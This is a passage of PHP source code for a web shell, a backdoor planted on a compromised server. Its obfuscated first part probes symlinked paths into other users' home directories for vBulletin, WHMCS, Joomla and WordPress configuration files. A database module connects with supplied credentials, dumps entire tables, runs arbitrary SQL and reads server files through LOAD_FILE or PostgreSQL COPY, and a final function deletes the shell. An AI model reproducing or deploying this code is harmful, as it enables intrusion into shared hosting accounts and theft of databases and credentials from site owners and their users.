$IIIIIIIIllI1=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'/public_html/vb/includes/config.php';
$IIIIIIIIlllI=get_headers($IIIIIIIIllI1);
$IIIIIIIIllll=$IIIIIIIIlllI[0];
$IIIIIIIIlll1=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'/public_html/forum/includes/config.php';
$IIIIIIIIll1I=get_headers($IIIIIIIIlll1);
$IIIIIIIIll1l=$IIIIIIIIll1I[0];
$IIIIIIIIll11=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'public_html/clients/configuration.php';
$IIIIIIIIl1II=get_headers($IIIIIIIIll11);
$IIIIIIIIl1Il=$IIIIIIIIl1II[0];
$IIIIIIIIl1I1=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'/public_html/support/configuration.php';
$IIIIIIIIl1II=get_headers($IIIIIIIIl1I1);
$IIIIIIIIl1lI=$IIIIIIIIl1II[0];
$IIIIIIIIl1ll=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'/public_html/client/configuration.php';
$IIIIIIIIl1l1=get_headers($IIIIIIIIl1ll);
$IIIIIIIIl11I=$IIIIIIIIl1l1[0];
$IIIIIIIIl11l=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'/public_html/submitticket.php';
$IIIIIIIIl111=get_headers($IIIIIIIIl11l);
$IIIIIIII1III=$IIIIIIIIl111[0];
$IIIIIIII1IIl=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'/public_html/client/configuration.php';
$IIIIIIII1II1=get_headers($IIIIIIII1IIl);
$IIIIIIII1IlI=$IIIIIIII1II1[0];
$IIIIIIII1Ill = strpos($IIIIIIIII11l,'200');
$IIIIIIII1I1I='&nbsp;';
if (strpos($IIIIIIIII11l,'200') == true )
{
$IIIIIIII1I1I="<a href='".$IIIIIIIII1l1."' target='_blank'>Wordpress</a>";
}
elseif (strpos($IIIIIIIIlIIl,'200') == true)
{
$IIIIIIII1I1I="<a href='".$IIIIIIIII111."' target='_blank'>Wordpress</a>";
}
elseif (strpos($IIIIIIIIlIll,'200')  == true and strpos($IIIIIIII1III,'200')  == true )
{
$IIIIIIII1I1I=" <a href='".$IIIIIIIIl11l."' target='_blank'>WHMCS</a>";
}
elseif (strpos($IIIIIIIIl1lI,'200')  == true)
{
$IIIIIIII1I1I =" <a href='".$IIIIIIIIl1I1."' target='_blank'>WHMCS</a>";
}
elseif (strpos($IIIIIIIIl11I,'200')  == true)
{
$IIIIIIII1I1I =" <a href='".$IIIIIIIIl1ll."' target='_blank'>WHMCS</a>";
}
elseif (strpos($IIIIIIIIlIll,'200')  == true)
{
$IIIIIIII1I1I=" <a href='".$IIIIIIIIlII1."' target='_blank'>Joomla</a>";
}
elseif (strpos($IIIIIIIIlI1l,'200')  == true)
{
$IIIIIIII1I1I=" <a href='".$IIIIIIIIlIl1."' target='_blank'>Joomla</a>";
}
elseif (strpos($IIIIIIIIllIl,'200')  == true)
{
$IIIIIIII1I1I=" <a href='".$IIIIIIIIlI11."' target='_blank'>vBulletin</a>";
}
elseif (strpos($IIIIIIIIllll,'200')  == true)
{
$IIIIIIII1I1I=" <a href='".$IIIIIIIIllI1."' target='_blank'>vBulletin</a>";
}
elseif (strpos($IIIIIIIIll1l,'200')  == true)
{
$IIIIIIII1I1I=" <a href='".$IIIIIIIIlll1."' target='_blank'>vBulletin</a>";
}
else
{
continue;
}
$IIIIIIII1I1l = $IIIIIIIII1I1['name'] ;
echo '<tr><td><a href=http://www.'.$IIIIIIIIIl11[1][0].'/>'.$IIIIIIIIIl11[1][0].'</a></td>
<td>'.$IIIIIIII1I1I.'</td></tr>';flush();
}
}
}
}
echo "</center></table>";   
    
 }
    
    echo "</div>";
    madfooter();
    
}    


function madsql()
{
    
    
    class DbClass {
		var $type;
		var $link;
		var $res;
		function DbClass($type)	{
			$this->type = $type;
		}
		function connect($host, $user, $pass, $dbname){
			switch($this->type)	{
				case 'mysql':
					if( $this->link = @mysql_connect($host,$user,$pass,true) ) return true;
					break;
				case 'pgsql':
					$host = explode(':', $host);
					if(!$host[1]) $host[1]=5432;
					if( $this->link = @pg_connect("host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname") ) return true;
					break;
			}
			return false;
		}
		function selectdb($db) {
			switch($this->type)	{
				case 'mysql':
					if (@mysql_select_db($db))return true;
					break;
			}
			return false;
		}
		function query($str) {
			switch($this->type) {
				case 'mysql':
					return $this->res = @mysql_query($str);
					break;
				case 'pgsql':
					return $this->res = @pg_query($this->link,$str);
					break;
			}
			return false;
		}
		function fetch() {
			$res = func_num_args()?func_get_arg(0):$this->res;
			switch($this->type)	{
				case 'mysql':
					return @mysql_fetch_assoc($res);
					break;
				case 'pgsql':
					return @pg_fetch_assoc($res);
					break;
			}
			return false;
		}
		function listDbs() {
			switch($this->type)	{
				case 'mysql':
                        return $this->query("SHOW databases");
				break;
				case 'pgsql':
					return $this->res = $this->query("SELECT datname FROM pg_database WHERE datistemplate!='t'");
				break;
			}
			return false;
		}
		function listTables() {
			switch($this->type)	{
				case 'mysql':
					return $this->res = $this->query('SHOW TABLES');
				break;
				case 'pgsql':
					return $this->res = $this->query("select table_name from information_schema.tables where table_schema != 'information_schema' AND table_schema != 'pg_catalog'");
				break;
			}
			return false;
		}
		function error() {
			switch($this->type)	{
				case 'mysql':
					return @mysql_error();
				break;
				case 'pgsql':
					return @pg_last_error();
				break;
			}
			return false;
		}
		function setCharset($str) {
			switch($this->type)	{
				case 'mysql':
					if(function_exists('mysql_set_charset'))
						return @mysql_set_charset($str, $this->link);
					else
						$this->query('SET CHARSET '.$str);
					break;
				case 'pgsql':
					return @pg_set_client_encoding($this->link, $str);
					break;
			}
			return false;
		}
		function loadFile($str) {
			switch($this->type)	{
				case 'mysql':
					return $this->fetch($this->query("SELECT LOAD_FILE('".addslashes($str)."') as file"));
				break;
				case 'pgsql':
					$this->query("CREATE TABLE wso2(file text);COPY wso2 FROM '".addslashes($str)."';select file from wso2;");
					$r=array();
					while($i=$this->fetch())
						$r[] = $i['file'];
					$this->query('drop table wso2');
					return array('file'=>implode("\n",$r));
				break;
			}
			return false;
		}
		function dump($table, $fp = false) {
			switch($this->type)	{
				case 'mysql':
					$res = $this->query('SHOW CREATE TABLE `'.$table.'`');
					$create = mysql_fetch_array($res);
					$sql = $create[1].";\n";
                    if($fp) fwrite($fp, $sql); else echo($sql);
					$this->query('SELECT * FROM `'.$table.'`');
                    $head = true;
					while($item = $this->fetch()) {
						$columns = array();
						foreach($item as $k=>$v) {
                            if($v == null)
                                $item[$k] = "NULL";
                            elseif(is_numeric($v))
                                $item[$k] = $v;
                            else
                                $item[$k] = "'".@mysql_real_escape_string($v)."'";
							$columns[] = "`".$k."`";
						}
                        if($head) {
                            $sql = 'INSERT INTO `'.$table.'` ('.implode(", ", $columns).") VALUES \n\t(".implode(", ", $item).')';
                            $head = false;
                        } else
                            $sql = "\n\t,(".implode(", ", $item).')';
                        if($fp) fwrite($fp, $sql); else echo($sql);
					}
                    if(!$head)
                        if($fp) fwrite($fp, ";\n\n"); else echo(";\n\n");
				break;
				case 'pgsql':
					$this->query('SELECT * FROM '.$table);
					while($item = $this->fetch()) {
						$columns = array();
						foreach($item as $k=>$v) {
							$item[$k] = "'".addslashes($v)."'";
							$columns[] = $k;
						}
                        $sql = 'INSERT INTO '.$table.' ('.implode(", ", $columns).') VALUES ('.implode(", ", $item).');'."\n";
                        if($fp) fwrite($fp, $sql); else echo($sql);
					}
				break;
			}
			return false;
		}
	};
	$db = new DbClass($_POST['type']);
	if(@$_POST['p2']=='download') {
		$db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
		$db->selectdb($_POST['sql_base']);
        switch($_POST['charset']) {
            case "Windows-1251": $db->setCharset('cp1251'); break;
            case "UTF-8": $db->setCharset('utf8'); break;
            case "KOI8-R": $db->setCharset('koi8r'); break;
            case "KOI8-U": $db->setCharset('koi8u'); break;
            case "cp866": $db->setCharset('cp866'); break;
        }
        if(empty($_POST['file'])) {
            ob_start("ob_gzhandler", 4096);
            header("Content-Disposition: attachment; filename=dump.sql");
            header("Content-Type: text/plain");
            foreach($_POST['tbl'] as $v)
				$db->dump($v);
            exit;
        } elseif($fp = @fopen($_POST['file'], 'w')) {
            foreach($_POST['tbl'] as $v)
                $db->dump($v, $fp);
            fclose($fp);
            unset($_POST['p2']);
        } else
            die('<script>alert("Error! Can\'t open file");window.history.back(-1)</script>');
	}
	madhead();
	echo "
<div class=header>
<form name='sf' method='post' onsubmit='fs(this);'><table cellpadding='2' cellspacing='0'><tr>
<td>Type</td><td>Host</td><td>Login</td><td>Password</td><td>Database</td><td></td></tr><tr>
<input type=hidden name=a value=Sql><input type=hidden name=p1 value='query'><input type=hidden name=p2 value=''><input type=hidden name=c value='". htmlspecialchars($GLOBALS['cwd']) ."'><input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'') ."'>
<td><select name='type'><option value='mysql' ";
    if(@$_POST['type']=='mysql')echo 'selected';
echo ">MySql</option><option value='pgsql' ";
if(@$_POST['type']=='pgsql')echo 'selected';
echo ">PostgreSql</option></select></td>
<td><input type=text name=sql_host value='". (empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host'])) ."'></td>
<td><input type=text name=sql_login value='". (empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login'])) ."'></td>
<td><input type=text name=sql_pass value='". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) ."'></td><td>";
	$tmp = "<input type=text name=sql_base value=''>";
	if(isset($_POST['sql_host'])){
		if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {
			switch($_POST['charset']) {
				case "Windows-1251": $db->setCharset('cp1251'); break;
				case "UTF-8": $db->setCharset('utf8'); break;
				case "KOI8-R": $db->setCharset('koi8r'); break;
				case "KOI8-U": $db->setCharset('koi8u'); break;
				case "cp866": $db->setCharset('cp866'); break;
			}
			$db->listDbs();
			echo "<select name=sql_base><option value=''></option>";
			while($item = $db->fetch()) {
				list($key, $value) = each($item);
				echo '<option value="'.$value.'" '.($value==$_POST['sql_base']?'selected':'').'>'.$value.'</option>';
			}
			echo '</select>';
		}
		else echo $tmp;
	}else
		echo $tmp;
	echo "</td>
				<td><input type=submit value='>>' onclick='fs(d.sf);'></td>
                <td><input type=checkbox name=sql_count value='on'" . (empty($_POST['sql_count'])?'':' checked') . "> count the number of rows</td>
			</tr>
		</table>
		<script>
            s_db='".@addslashes($_POST['sql_base'])."';
            function fs(f) {
                if(f.sql_base.value!=s_db) { f.onsubmit = function() {};
                    if(f.p1) f.p1.value='';
                    if(f.p2) f.p2.value='';
                    if(f.p3) f.p3.value='';
                }
            }
			function st(t,l) {
				d.sf.p1.value = 'select';
				d.sf.p2.value = t;
                if(l && d.sf.p3) d.sf.p3.value = l;
				d.sf.submit();
			}
			function is() {
				for(i=0;i<d.sf.elements['tbl[]'].length;++i)
					d.sf.elements['tbl[]'][i].checked = !d.sf.elements['tbl[]'][i].checked;
			}
		</script>";
	if(isset($db) && $db->link){
		echo "<br/><table width=100% cellpadding=2 cellspacing=0>";
			if(!empty($_POST['sql_base'])){
				$db->selectdb($_POST['sql_base']);
				echo "<tr><td width=1 style='border-top:2px solid #666;'><span>Tables:</span><br><br>";
				$tbls_res = $db->listTables();
				while($item = $db->fetch($tbls_res)) {
					list($key, $value) = each($item);
                    if(!empty($_POST['sql_count']))
                        $n = $db->fetch($db->query('SELECT COUNT(*) as n FROM '.$value.''));
					$value = htmlspecialchars($value);
					echo "<nobr><input type='checkbox' name='tbl[]' value='".$value."'>&nbsp;<a href=# onclick=\"st('".$value."',1)\">".$value."</a>" . (empty($_POST['sql_count'])?'&nbsp;':" <small>({$n['n']})</small>") . "</nobr><br>";
				}
				echo "<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>";
				if(@$_POST['p1'] == 'select') {
					$_POST['p1'] = 'query';
                    $_POST['p3'] = $_POST['p3']?$_POST['p3']:1;
					$db->query('SELECT COUNT(*) as n FROM ' . $_POST['p2']);
					$num = $db->fetch();
					$pages = ceil($num['n'] / 30);
                    echo "<script>d.sf.onsubmit=function(){st(\"" . $_POST['p2'] . "\", d.sf.p3.value)}</script><span>".$_POST['p2']."</span> ({$num['n']} records) Page # <input type=text name='p3' value=" . ((int)$_POST['p3']) . ">";
                    echo " of $pages";
                    if($_POST['p3'] > 1)
                        echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3']-1) . ")'>&lt; Prev</a>";
                    if($_POST['p3'] < $pages)
                        echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3']+1) . ")'>Next &gt;</a>";
                    $_POST['p3']--;
					if($_POST['type']=='pgsql')
						$_POST['p2'] = 'SELECT * FROM '.$_POST['p2'].' LIMIT 30 OFFSET '.($_POST['p3']*30);
					else
						$_POST['p2'] = 'SELECT * FROM `'.$_POST['p2'].'` LIMIT '.($_POST['p3']*30).',30';
					echo "<br><br>";
				}
				if((@$_POST['p1'] == 'query') && !empty($_POST['p2'])) {
					$db->query(@$_POST['p2']);
					if($db->res !== false) {
						$title = false;
						echo '<table width=100% cellspacing=1 cellpadding=2 class=main style="background-color:#292929">';
						$line = 1;
						while($item = $db->fetch())	{
							if(!$title)	{
								echo '<tr>';
								foreach($item as $key => $value)
									echo '<th>'.$key.'</th>';
								reset($item);
								$title=true;
								echo '</tr><tr>';
								$line = 2;
							}
							echo '<tr class="l'.$line.'">';
							$line = $line==1?2:1;
							foreach($item as $key => $value) {
								if($value == null)
									echo '<td><i>null</i></td>';
								else
									echo '<td>'.nl2br(htmlspecialchars($value)).'</td>';
							}
							echo '</tr>';
						}
						echo '</table>';
					} else {
						echo '<div><b>Error:</b> '.htmlspecialchars($db->error()).'</div>';
					}
				}
				echo "<br></form><form onsubmit='d.sf.p1.value=\"query\";d.sf.p2.value=this.query.value;document.sf.submit();return false;'><textarea name='query' style='width:100%;height:100px'>";
                if(!empty($_POST['p2']) && ($_POST['p1'] != 'loadfile'))
                    echo htmlspecialchars($_POST['p2']);
                echo "</textarea><br/><input type=submit value='Execute'>";
				echo "</td></tr>";
			}
			echo "</table></form><br/>";
            if($_POST['type']=='mysql') {
                $db->query("SELECT 1 FROM mysql.user WHERE concat(`user`, '@', `host`) = USER() AND `File_priv` = 'y'");
                if($db->fetch())
                    echo "<form onsubmit='d.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'><span>Load file</span> <input  class='toolsInp' type=text name=f><input type=submit value='>>'></form>";
            }
			if(@$_POST['p1'] == 'loadfile') {
				$file = $db->loadFile($_POST['p2']);
				echo '<pre class=ml1>'.htmlspecialchars($file['file']).'</pre>';
			}
	} else {
        echo htmlspecialchars($db->error());
    }
	echo '</div>';
    madfooter();
    
 }
 
 function madselfrm()
 {
    
    if($_POST['p1'] == 'yes')
		if(@unlink(preg_replace('!\(\d+\)\s.*!', '', 'C:\wamp\www\mss.php')))
			die('Shell has been removed');
		else
			echo 'unlink error!';
    if($_POST['p1'] != 'yes')
        madhead();
	echo "<div class=header><pre class=ml1 style='margin-top:5px'>";
    
    
    echo "
    
                /^\
       _.-`:   /   \   :'-._
     ,`    :  |     |  :    '.
   ,`       \,|     |,/       '.
  /           `-...-`           \
 :              .'.              :
 |             . ' .             |
 |             ' . '             |
 :              '.'              :
  \           ,-'''-,           /
   `.       /'|     |'\       ,'
     `._   ;  |     |  ;   _,'
        `-.:  |     |  :,-'
              |     |
              |     |
              |     |
              |     |
              |     |
";
    
    
    
    echo '<br>Kill Me?<br><a href=# onclick="g(null,null,\'yes\')">Yes</a></div>';
	madFooter();
    
 }


if( empty($_POST['a']) )
	if(isset($default_action) && function_exists('mad' . $default_action))
		$_POST['a'] = $default_action;
	else
		$_POST['a'] = 'FilesMan';
if( !empty($_POST['a']) && function_exists('mad' . $_POST['a']) )
	call_user_func('mad' . $_POST['a']);
	exit;
?>
